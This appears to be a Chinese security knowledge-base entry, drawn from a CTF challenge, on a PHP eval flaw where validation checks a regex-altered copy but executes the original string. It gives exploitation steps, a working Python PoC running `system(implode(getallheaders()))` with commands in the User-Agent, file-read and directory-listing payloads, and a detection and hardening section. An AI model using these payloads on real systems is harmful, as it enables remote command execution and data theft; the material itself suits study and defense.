---
id: web-php-rce-eval-getallheaders-no-param-function-call
title: PHP eval 校验副本不校验原串：getallheaders() 把请求头变成任意函数参数，system(implode(...)) 命令执行
type: scenario
domain: web
path: web/php/rce
technique: php-eval-getallheaders-function-call
tags:
- php
- eval
- getallheaders
- no-parameter
- request-header
- command-injection
- arbitrary-file-read
- filter-bypass
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V108
  verified_at: '2026-11-05T22:36:10+08:00'
  notes: 对照 Web225：preg_replace 校验副本 vs eval 原串、getallheaders()/implode/min 变体、unlock proof 一致；未复跑
url: /docs/web/php/rce/web-php-rce-eval-getallheaders-no-param-function-call/
draft: false
kb_aliases:
- getallheaders 无参 RCE
- PHP 请求头命令注入
- system(implode(getallheaders()))
- min(getallheaders()) 任意文件读
- 校验副本与执行原串不一致
- 计算器 eval 无参函数链
---

## 一句话结论

当 PHP 后端把用户提交的 `coke` 当作代码 `eval`，只用正则对“去掉小写标识符后的副本”做无参函数调用形状校验，而真正执行的是原始字符串时，攻击者可以用 `system(implode(getallheaders()))` 把完全可控的请求头拼成命令；同一原语还可用 `readfile(min(getallheaders()))` 读取任意文件。

## 原理

- 后端接收 `coke` 参数后执行 `eval($code)`。校验逻辑用 `preg_replace('/[a-z_]+(?R)?/', '', $code)` 删除小写函数名/标识符，再检查剩余字符是否构成合法的无参调用骨架；但它校验的是处理后的副本，`eval` 收到的仍是原始 `$code`，于是“校验对象”和“执行对象”不是同一个字符串——函数名和参数在真正执行时完全不受限制。
- `getallheaders()` 是 PHP 内置函数，返回本次请求的全部 HTTP 头组成的关联数组，键和值都来自客户端，完全可控。把该数组交给 `implode()` 会按头出现的顺序拼接所有值。
- 在 `User-Agent` 中写入 `x;<命令>;#`：`implode(getallheaders())` 得到形如 `x;cat /flag;#...` 的字符串，`system()` 把它交给 `/bin/sh -c`，分号完成命令分隔，`#` 注释掉后续头值。
- 同样的思路可把“取一个头值”的函数当作参数源：`min(getallheaders())` 返回字典序最小的头值。Linux 绝对路径以 `/`（0x2F）开头，小于所有字母和数字，因此只要某个头值写成 `/flag`，`min(...)` 就恒等于 `/flag`；`readfile(min(getallheaders()))` 即任意文件读，`print_r(scandir(min(...)))` 即目录枚举。
- 题目额外的黑名单（`localeconv|current|pos|array_reverse`、`getcwd|current`）只针对常见无参 RCE gadget，没有覆盖 `getallheaders`；`disable_functions` 与 `open_basedir` 均为空，进一步放大了危害。

## 触发条件

- PHP 应用存在 `eval($_POST[...])`/`eval($_GET[...])` 等可控代码执行入口。
- 校验逻辑对输入做过 `preg_replace`、`str_replace`、类型转换等处理，但 `eval` 执行的是处理前的原始字符串；或黑名单/白名单不完整。
- `disable_functions` 未禁用 `system`/`readfile`/`scandir` 等，`open_basedir` 为空或未限制目标路径。
- 请求头可由攻击者自由设置（大多数 HTTP 客户端/代理都允许）。

## 利用步骤

1. 确认 `coke=phpinfo()` 可执行，说明 `eval` 入口存在且校验可绕过。
2. 发送 `coke=system(implode(getallheaders()))`，并在 `User-Agent` 中写入 `x;<命令>;#`。
3. 观察响应中的命令输出；先 `id` 确认权限，再 `cat /flag` 或读取配置/密钥。
4. 若不回显，可把命令输出写文件、发外带请求，或用 `exec`/`shell_exec`/反引号等替代函数。
5. 文件读取变体：发送 `coke=readfile(min(getallheaders()))`，任一请求头值设为 `/flag`；目录枚举用 `print_r(scandir(min(getallheaders())))`。

## PoC

```python
import re, requests

def rce(cmd):
    payload = "system(implode(getallheaders()))"
    headers = {"User-Agent": "x;%s;#" % cmd}
    r = requests.post(API, params={"yali": "stress"},
                      data={"coke": payload}, headers=headers, timeout=25)
    return r.text

print(rce("id; cat /flag"))

def read_file(path):
    payload = "readfile(min(getallheaders()))"
    r = requests.post(API, params={"yali": "stress"},
                      data={"coke": payload},
                      headers={"User-Agent": path}, timeout=25)
    return r.text

print(read_file("/flag"))
```

```php
// 校验副本、执行原串的典型错误形态
$code = $_POST['coke'];
$check = preg_replace('/[a-z_]+(?R)?/', '', $code);
if (/* $check 符合无参调用骨架 */) {
    eval($code);   // 原串中的函数名与参数并未被校验
}
```

## 变体与关联

- 变体：`system(next(getallheaders()))`、`system(end(getallheaders()))` 等按位置取头值；`current(getallheaders())` 取第一个头值，配合一个排在最前且完全可控的头（如 `X-Real-Ip`）即可把任意代码塞进 `eval(current(getallheaders()))`；`assert`、`create_function`、`preg_replace /e`（旧版）等动态执行入口同理。
- 变体：若 `system` 被禁用，`readfile`/`file_get_contents`/`scandir`/`glob` 可做文件读取与目录枚举；`mail`/`putenv`/`error_log` 可做外带。
- 关联：[[web-php-rce-no-param-localeconv-scandir-chdir]]（无引号无数字的 localeconv 上跳）、[[web-php-rce-no-param-get-defined-vars]]（用 `get_defined_vars` 取外部参数）、[[web-php-rce-eval-expression-closing-paren-injection]]（eval 拼接表达式注入）。
- 边界：`getallheaders()` 在 FPM/Apache 下可用，部分 SAPI 可能不存在；头顺序影响 `implode` 结果，用 `#` 注释后续；`open_basedir` 会限制文件读取；WAF 若检查请求头内容可能拦截。

## 检测与防御

- 检测：代码审计搜索 `eval($code)` 且 `$code` 来自请求、校验使用 `preg_replace` 后仍执行原串；请求体出现 `getallheaders`、`implode`、`min(` 等组合；异常 `User-Agent` 含分号、命令、`#`；响应中出现命令输出或文件内容。
- 修复：禁止对用户输入 `eval`；若必须支持表达式，使用白名单函数表并只允许固定无参函数，执行前重新构造调用而不是执行原串；校验与执行必须使用同一个已规范化字符串。
- 加固：`disable_functions` 禁用 `system/exec/shell_exec/passthru/popen/proc_open` 等；设置 `open_basedir`；限制请求头长度与字符集；Web 进程降权、容器只读。
